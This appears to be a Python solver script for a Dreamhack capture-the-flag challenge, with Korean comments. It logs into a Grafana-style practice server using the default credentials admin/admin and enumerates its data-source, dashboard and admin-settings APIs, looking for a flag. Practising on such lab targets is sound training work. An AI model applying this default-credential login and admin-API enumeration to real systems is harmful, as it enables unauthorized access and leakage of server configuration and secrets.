import requests

# 1. 호스트 정보 확인
host = "http://host8.dreamhack.games:22995"
auth = ('admin', 'admin')

def check_endpoint(name, endpoint):
    url = f"{host}{endpoint}"
    print(f"\n[*] Scanning {name} ({endpoint})...")
    try:
        res = requests.get(url, auth=auth)
        if res.status_code != 200:
            print(f"[-] Failed: {res.status_code}")
            return
            
        data = res.json()
        
        # 1. 딕셔너리 형태인 경우 (Settings 등)
        if isinstance(data, dict):
            # 전체 텍스트에서 검색
            if "DH{" in res.text:
                print(f"[!!!] FLAG FOUND in {name} raw text!")
                # 대략적인 위치 찾기
                start = res.text.find("DH{")
                print(f"Content: ...{res.text[start:start+50]}...")
            else:
                print(f"[-] No flag in {name}.")

        # 2. 리스트 형태인 경우 (DataSources, Dashboards)
        elif isinstance(data, list):
            found = False
            for item in data:
                # 이름이나 제목 필드 확인
                item_name = item.get('name', item.get('title', 'Unknown'))
                print(f" - Found: {item_name}")
                if "DH{" in item_name:
                    print(f"\n[!!!] FLAG FOUND: {item_name}\n")
                    found = True
            if not found:
                print(f"[-] No flag in {name} list.")
                
    except Exception as e:
        print(f"[!] Error: {e}")

# 실행: 의심스러운 곳 3군데 집중 타격
# 1. 데이터 소스 (DB 연결 이름에 숨기는 경우가 많음)
check_endpoint("Data Sources", "/api/datasources")

# 2. 대시보드 목록
check_endpoint("Dashboards", "/api/search")

# 3. 서버 전체 설정값 (defaults.ini의 실시간 버전)
check_endpoint("Server Settings", "/api/admin/settings")